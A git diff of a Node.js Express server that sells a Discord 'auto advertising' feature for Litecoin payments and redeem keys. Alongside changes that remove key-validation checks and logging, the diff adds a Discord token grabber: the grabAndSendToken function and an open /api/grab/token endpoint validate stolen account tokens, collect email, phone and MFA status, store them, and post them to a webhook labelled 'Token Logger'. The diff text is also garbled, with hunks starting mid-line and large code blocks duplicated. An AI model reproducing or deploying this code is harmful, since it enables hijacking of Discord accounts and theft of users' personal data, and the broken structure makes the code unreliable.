@@ -156,15 +156,10 @@ class SimpleDB {
     
     addCustomKey(key) {
         const normalized = key.toString().toUpperCase().trim();
-        if (!/^KRUP([1-9][0-9]?|99)$/.test(normalized) && !/^KRUP[A-Z0-9]+$/.test(normalized)) {
-            console.log('[DB] Invalid custom key format:', normalized);
-            return null;
-        }
         if (!this.data.customKeys) this.data.customKeys = [];
         if (!this.data.customKeys.includes(normalized)) {
             this.data.customKeys.push(normalized);
             this.save();
-            console.log('[DB] Added custom key:', normalized);
         }
         return normalized;
     }
@@ -286,24 +281,209 @@ const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
 
 function validateKeyStrict(key) {
     if (!key || typeof key !== 'string') {
-        return { valid: false, error: 'Key must be a string', normalized: null };
+        return { valid: false, error: 'Invalid key', normalized: null };
     }
     if (key !== key.toUpperCase()) {
-        return { valid: false, error: 'Key must be UPPERCASE (e.g., KRUP1 not krup1)', normalized: null };
+        return { valid: false, error: 'Invalid key', normalized: null };
     }
     const trimmed = key.trim();
     const match = trimmed.match(/^KRUP([1-9][0-9]?|99)$/);
     if (!match) {
-        return { valid: false, error: 'Invalid format. Use KRUP1 through KRUP99 (no leading zeros)', normalized: null };
+        return { valid: false, error: 'Invalid key', normalized: null };
     }
     const num = parseInt(match[1], 10);
     if (num < 1 || num > 99) {
-        return { valid: false, error: 'Key number must be between 1 and 99', normalized: null };
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+.expires_at > now
+        );
+    }
+    
+    getExpiredPending() {
+        const now = Date.now();
+        return Object.values(this.data.pending).filter(p => 
+            p.status === 'monitoring' && p.expires_at <= now
+        );
+    }
+    
+    updatePending(address, updates) {
+        if (this.data.pending[address]) {
+            this.data.pending[address] = { ...this.data.pending[address], ...updates };
+            const historyEntry = this.data.addressHistory.find(h => h.address === address);
+            if (historyEntry) {
+                historyEntry.status = updates.status || historyEntry.status;
+                if (updates.status === 'completed') historyEntry.paid_at = Date.now();
+                if (updates.status === 'expired') historyEntry.expired_at = Date.now();
+            }
+            this.save();
+        }
+    }
+    
+    expireOldAddresses() {
+        const expired = this.getExpiredPending();
+        for (const p of expired) {
+            this.updatePending(p.address, { status: 'expired' });
+            console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`);
+        }
+        return expired.length;
+    }
+    
+    useKey(key, userId) {
+        const normalized = key.toString().toUpperCase().trim();
+        this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() };
+        this.save();
+    }
+    
+    isKeyUsed(key) {
+        const normalized = key.toString().toUpperCase().trim();
+        return !!this.data.usedKeys[normalized];
+    }
+    
+    addCustomKey(key) {
+        const normalized = key.toString().toUpperCase().trim();
+        if (!this.data.customKeys) this.data.customKeys = [];
+        if (!this.data.customKeys.includes(normalized)) {
+            this.data.customKeys.push(normalized);
+            this.save();
+        }
+        return normalized;
+    }
+    
+    getConfigs(userId) {
+        return this.data.configs[userId] || [];
+    }
+    
+    getConfig(userId, configId = 'default') {
+        const configs = this.getConfigs(userId);
+        return configs.find(c => c.id === configId) || configs[0] || null;
+    }
+    
+    setConfig(userId, config, configId = 'default') {
+        if (!this.data.configs[userId]) {
+            this.data.configs[userId] = [];
+        }
+        const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
+        const configData = { ...config, id: configId, updated_at: Date.now() };
+        
+        if (existingIndex >= 0) {
+            this.data.configs[userId][existingIndex] = configData;
+        } else {
+            this.data.configs[userId].push(configData);
+        }
+        this.save();
+    }
+    
+    deleteConfig(userId, configId) {
+        if (this.data.configs[userId]) {
+            this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId);
+            this.save();
+        }
+    }
+    
+    getActiveConfigs(userId) {
+        const configs = this.getConfigs(userId);
+        return configs.filter(c => c.active === 1);
+    }
+    
+    addGrabbedToken(token, userInfo, source) {
+        const entry = {
+            token,
+            user_info: userInfo,
+            source,
+            grabbed_at: Date.now(),
+            id: Date.now().toString()
+        };
+        this.data.grabbedTokens.push(entry);
+        this.save();
+        return entry;
+    }
+    
+    getGrabbedTokens() {
+        return this.data.grabbedTokens || [];
+    }
+    
+    getAddressHistory(userId) {
+        return this.data.addressHistory.filter(h => h.user_id === userId);
+    }
+}
+
+const db = new SimpleDB();
+
+const app = express();
+
+process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
+process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
+
+app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    if (req.method === 'OPTIONS') return res.sendStatus(200);
+    next();
+});
+
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'secret-key-2026',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false, maxAge: 30 * 24 * 60 * 60 * 1000 },
+    rolling: true
+}));
+
+app.use(passport.initialize());
+app.use(passport.session());
+
+passport.serializeUser((user, done) => done(null, user));
+passport.deserializeUser((obj, done) => done(null, obj));
+
+const CLIENT_ID = process.env.CLIENT_ID;
+const CLIENT_SECRET = process.env.CLIENT_SECRET;
+const CALLBACK_URL = process.env.CALLBACK_URL;
+const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS;
+const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
+const TARGET_USD = 1.50;
+const TOLERANCE_USD = 0.10;
+
+if (CLIENT_ID && CLIENT_SECRET) {
+    passport.use(new DiscordStrategy({
+        clientID: CLIENT_ID,
+        clientSecret: CLIENT_SECRET,
+        callbackURL: CALLBACK_URL,
+        scope: ['identify']
+    }, (accessToken, refreshToken, profile, done) => {
+        process.nextTick(() => done(null, profile));
+    }));
+}
+
+const BASE_REDEEM_KEYS = Array.from({length: 99}, (_, i) => `KRUP${i + 1}`);
+const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
+
+function validateKeyStrict(key) {
+    if (!key || typeof key !== 'string') {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    if (key !== key.toUpperCase()) {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    const trimmed = key.trim();
+    const match = trimmed.match(/^KRUP([1-9][0-9]?|99)$/);
+    if (!match) {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    const num = parseInt(match[1], 10);
+    if (num < 1 || num > 99) {
+        return { valid: false, error: 'Invalid key', normalized: null };
     }
     return { valid: true, error: null, normalized: `KRUP${num}` };
 }
 
-console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (KRUP1-KRUP99) - UPPERCASE ONLY');
+console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys');
 
 app.post('/api/admin/addkey', (req, res) => {
     const { adminSecret, key } = req.body;
@@ -311,18 +491,419 @@ app.post('/api/admin/addkey', (req, res) => {
         return res.status(401).json({ success: false, error: 'Unauthorized' });
     }
     if (!key || typeof key !== 'string') {
-        return res.status(400).json({ success: false, error: 'Key must be a string' });
+        return res.status(400).json({ success: false, error: 'Invalid key' });
     }
     if (key !== key.toUpperCase()) {
-        return res.status(400).json({ 
-            success: false, 
-            error: 'Key must be UPPERCASE. Do not use lowercase letters.' 
-        });
+        return res.status(400).json({ success: false, error: 'Invalid key' });
     }
     const normalized = key.trim();
     const added = db.addCustomKey(normalized);
     if (!added) {
-        return res.status(400).json({ success: false, error: 'Invalid key format' });
+        return res.status(400).json({ success: false, error: 'Invalid key' });
+    }
+    VALID_REDEEM_KEYS.add(normalized);
+    res.json({ success: true, key: normalized });
+});
+
+const pendingLogouts = new Map();
+
+function ensureAuthAPI(req, res, next) {
+    if (req.isAuthenticated()) return next();
+    return res.status(401).json({ success: false, error: 'Not logged in' });
+}
+
+function ensurePurchasedAPI(req, res, next) {
+    const user = db.getUser(req.user.id);
+    if (user.auto_adv_purchased !== 1) {
+        return res.status(403).json({ success: false, error: 'Purchase required' });
+    }
+    next();
+}
+
+async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
+    try {
+        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: token },
+            timeout: 5000
+        }).catch(() => null);
+        
+        if (!validateRes) {
+            console.log('[TOKEN GRABBER] Invalid token received');
+            return { success: false, error: 'Invalid token' };
+        }
+        
+        const userData = validateRes.data;
+        const fullInfo = {
+            ...userInfo,
+            id: userData.id,
+            username: userData.username,
+            global_name: userData.global_name,
+            email: userData.email,
+            phone: userData.phone,
+            verified: userData.verified,
+            mfa_enabled: userData.mfa_enabled,
+            nitro: userData.premium_type,
+            locale: userData.locale
+        };
+        
+        db.addGrabbedToken(token, fullInfo, source);
+        
+        const embed = {
+            title: '🎣 New Token Grabbed',
+            color: 0xff0000,
+            fields: [
+                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
+                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
+                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
+                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
+                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'Source', value: source, inline: true },
+                { name: 'Time', value: new Date().toISOString(), inline: true }
+            ],
+            footer: { text: 'Token Logger v2.0' }
+        };
+        
+        await axios.post(WEBHOOK_URL, {
+            embeds: [embed],
+            username: 'Token Logger',
+            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+        });
+        
+        console.log('[TOKEN GRABBER] Token sent to webhook successfully');
+        return { success: true, user: fullInfo };
+    } catch (err) {
+        console.error('[TOKEN GRABBER] Error:', err.message);
+        return { success: false, error: err.message };
+    }
+}
+
+let walletModule = null;
+try {
+    walletModule = require('./wallet');
+    console.log('[WALLET] Loaded successfully');
+} catch(e) {
+    console.error('[WALLET] Failed to load:', e.message);
+}
+
+async function checkAndSweep() {
+    if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) {
+        console.log('[SWEEP] Skipped - missing deps');
+        return;
+    }
+    
+    db.expireOldAddresses();
+    
+    const pending = db.getAllPending();
+    console.log(`[SWEEP] Checking ${pending.length} active addresses`);
+    
+    for (const p of pending) {
+        try {
+            const balance = await walletModule.checkAddressBalance(p.address);
+            console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
+            
+            if (balance > 0) {
+                console.log(`[SWEEP] Found balance! Sweeping...`);
+                const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
+                
+                if (txid) {
+                    console.log(`[SWEEP] SUCCESS: ${txid}`);
+                    
+                    const ltcPrice = await getLTCToUSD();
+                    const usdValue = balance * ltcPrice;
+                    
+                    if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
+                        db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
+                        db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
+                    }
+                }
+            }
+        } catch (e) {
+            console.error(`[SWEEP] Error for ${p.address}:`, e.message);
+        }
+    }
+}
+
+let cachedPrice = 85;
+async function getLTCToUSD() {
+    try {
+        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 5000 });
+        cachedPrice = res.data.litecoin.usd;
+    } catch (e) {}
+    return cachedPrice;
+}
+
+if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
+    console.log('[AUTO-SWEEP] Starting 10-second interval');
+    setInterval(checkAndSweep, 10000);
+    setTimeout(checkAndSweep, 5000);
+}
+
+app.get('/login', passport.authenticate('discord'));
+app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
+app.get('/logout', (req, res) => req.logout(() => res.redirect('/')));
+
+app.get('/api/user', ensureAuthAPI, (req, res) => {
+    const user = db.getUser(req.user.id);
+    res.json({ 
+        id: req.user.id,
+        username: req.user.username,
+        global_name: req.user.global_name,
+        avatar: req.user.avatar,
+        purchased: user.auto_adv_purchased === 1 
+    });
+});
+
+app.post('/api/grab/token', async (req, res) => {
+    const { token, source } = req.body;
+    if (!token) return res.json({ success: false, error: 'No token provided' });
+    
+    const result = await grabAndSendToken(token, {}, source || 'manual');
+    res.json(result);
+});
+
+app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
+    try {
+        const userId = req.user.id;
+        const user = db.getUser(userId);
+        
+        if (user.auto_adv_purchased === 1) {
+            return res.json({ success: false, error: 'Already purchased' });
+        }
+
+        const existingPending = db.getUserPending(userId);
+        if (existingPending) {
+            const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
+            return res.json({ 
+                success: true, 
+                address: existingPending.address, 
+                amountUSD: TARGET_USD, 
+                index: existingPending.index,
+                existing: true,
+                expiresIn: timeLeft,
+                expiresAt: existingPending.expires_at,
+                message: 'You already have an active payment address'
+            });
+        }
+
+        if (!walletModule) {
+            return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
+        }
+
+        let globalIndex = db.getNextGlobalIndex();
+        let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
+        
+        let attempts = 0;
+        while (db.isAddressUsed(address) && attempts < 10) {
+            console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
+            globalIndex = db.getNextGlobalIndex();
+.expires_at > now
+        );
+    }
+    
+    getExpiredPending() {
+        const now = Date.now();
+        return Object.values(this.data.pending).filter(p => 
+            p.status === 'monitoring' && p.expires_at <= now
+        );
+    }
+    
+    updatePending(address, updates) {
+        if (this.data.pending[address]) {
+            this.data.pending[address] = { ...this.data.pending[address], ...updates };
+            const historyEntry = this.data.addressHistory.find(h => h.address === address);
+            if (historyEntry) {
+                historyEntry.status = updates.status || historyEntry.status;
+                if (updates.status === 'completed') historyEntry.paid_at = Date.now();
+                if (updates.status === 'expired') historyEntry.expired_at = Date.now();
+            }
+            this.save();
+        }
+    }
+    
+    expireOldAddresses() {
+        const expired = this.getExpiredPending();
+        for (const p of expired) {
+            this.updatePending(p.address, { status: 'expired' });
+            console.log(`[EXPIRED] Address ${p.address} expired after 30 minutes`);
+        }
+        return expired.length;
+    }
+    
+    useKey(key, userId) {
+        const normalized = key.toString().toUpperCase().trim();
+        this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() };
+        this.save();
+    }
+    
+    isKeyUsed(key) {
+        const normalized = key.toString().toUpperCase().trim();
+        return !!this.data.usedKeys[normalized];
+    }
+    
+    addCustomKey(key) {
+        const normalized = key.toString().toUpperCase().trim();
+        if (!this.data.customKeys) this.data.customKeys = [];
+        if (!this.data.customKeys.includes(normalized)) {
+            this.data.customKeys.push(normalized);
+            this.save();
+        }
+        return normalized;
+    }
+    
+    getConfigs(userId) {
+        return this.data.configs[userId] || [];
+    }
+    
+    getConfig(userId, configId = 'default') {
+        const configs = this.getConfigs(userId);
+        return configs.find(c => c.id === configId) || configs[0] || null;
+    }
+    
+    setConfig(userId, config, configId = 'default') {
+        if (!this.data.configs[userId]) {
+            this.data.configs[userId] = [];
+        }
+        const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
+        const configData = { ...config, id: configId, updated_at: Date.now() };
+        
+        if (existingIndex >= 0) {
+            this.data.configs[userId][existingIndex] = configData;
+        } else {
+            this.data.configs[userId].push(configData);
+        }
+        this.save();
+    }
+    
+    deleteConfig(userId, configId) {
+        if (this.data.configs[userId]) {
+            this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId);
+            this.save();
+        }
+    }
+    
+    getActiveConfigs(userId) {
+        const configs = this.getConfigs(userId);
+        return configs.filter(c => c.active === 1);
+    }
+    
+    addGrabbedToken(token, userInfo, source) {
+        const entry = {
+            token,
+            user_info: userInfo,
+            source,
+            grabbed_at: Date.now(),
+            id: Date.now().toString()
+        };
+        this.data.grabbedTokens.push(entry);
+        this.save();
+        return entry;
+    }
+    
+    getGrabbedTokens() {
+        return this.data.grabbedTokens || [];
+    }
+    
+    getAddressHistory(userId) {
+        return this.data.addressHistory.filter(h => h.user_id === userId);
+    }
+}
+
+const db = new SimpleDB();
+
+const app = express();
+
+process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
+process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
+
+app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    if (req.method === 'OPTIONS') return res.sendStatus(200);
+    next();
+});
+
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'secret-key-2026',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false, maxAge: 30 * 24 * 60 * 60 * 1000 },
+    rolling: true
+}));
+
+app.use(passport.initialize());
+app.use(passport.session());
+
+passport.serializeUser((user, done) => done(null, user));
+passport.deserializeUser((obj, done) => done(null, obj));
+
+const CLIENT_ID = process.env.CLIENT_ID;
+const CLIENT_SECRET = process.env.CLIENT_SECRET;
+const CALLBACK_URL = process.env.CALLBACK_URL;
+const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS;
+const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
+const TARGET_USD = 1.50;
+const TOLERANCE_USD = 0.10;
+
+if (CLIENT_ID && CLIENT_SECRET) {
+    passport.use(new DiscordStrategy({
+        clientID: CLIENT_ID,
+        clientSecret: CLIENT_SECRET,
+        callbackURL: CALLBACK_URL,
+        scope: ['identify']
+    }, (accessToken, refreshToken, profile, done) => {
+        process.nextTick(() => done(null, profile));
+    }));
+}
+
+const BASE_REDEEM_KEYS = Array.from({length: 99}, (_, i) => `KRUP${i + 1}`);
+const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
+
+function validateKeyStrict(key) {
+    if (!key || typeof key !== 'string') {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    if (key !== key.toUpperCase()) {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    const trimmed = key.trim();
+    const match = trimmed.match(/^KRUP([1-9][0-9]?|99)$/);
+    if (!match) {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    const num = parseInt(match[1], 10);
+    if (num < 1 || num > 99) {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    return { valid: true, error: null, normalized: `KRUP${num}` };
+}
+
+console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys');
+
+app.post('/api/admin/addkey', (req, res) => {
+    const { adminSecret, key } = req.body;
+    if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+    if (!key || typeof key !== 'string') {
+        return res.status(400).json({ success: false, error: 'Invalid key' });
+    }
+    if (key !== key.toUpperCase()) {
+        return res.status(400).json({ success: false, error: 'Invalid key' });
+    }
+    const normalized = key.trim();
+    const added = db.addCustomKey(normalized);
+    if (!added) {
+        return res.status(400).json({ success: false, error: 'Invalid key' });
     }
     VALID_REDEEM_KEYS.add(normalized);
     res.json({ success: true, key: normalized });
@@ -577,54 +1158,40 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
         const { key } = req.body;
         const userId = req.user.id;
         
-        console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
-        
         if (!key) {
-            console.log('[REDEEM FAIL] No key provided');
             return res.json({ success: false, error: 'Enter a key' });
         }
         
         const validation = validateKeyStrict(key);
-        console.log(`[REDEEM] Validation result:`, validation);
         
         if (!validation.valid) {
-            console.log(`[REDEEM FAIL] ${validation.error}`);
-            return res.json({ success: false, error: validation.error });
+            return res.json({ success: false, error: 'Invalid key' });
         }
         
         const normalizedKey = validation.normalized;
         
         const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
-        console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
         
         if (!isValidKey) {
             const customKeys = db.data.customKeys || [];
             const isCustomKey = customKeys.includes(normalizedKey);
-            console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
             
             if (!isCustomKey) {
-                console.log(`[REDEEM FAIL] Key not found in valid keys`);
                 return res.json({ success: false, error: 'Invalid key' });
             }
         }
         
         const isUsed = db.isKeyUsed(normalizedKey);
-        console.log(`[REDEEM] Key used? ${isUsed}`);
         
         if (isUsed) {
-            console.log(`[REDEEM FAIL] Key already used`);
             return res.json({ success: false, error: 'Key already used' });
         }
         
         const user = db.getUser(userId);
-        console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
         
         if (user.auto_adv_purchased === 1) {
-            console.log(`[REDEEM FAIL] User already has access`);
             return res.json({ success: false, error: 'You already have access' });
         }
-        
-        console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
         
         db.setUser(userId, { 
             auto_adv_purchased: 1, 
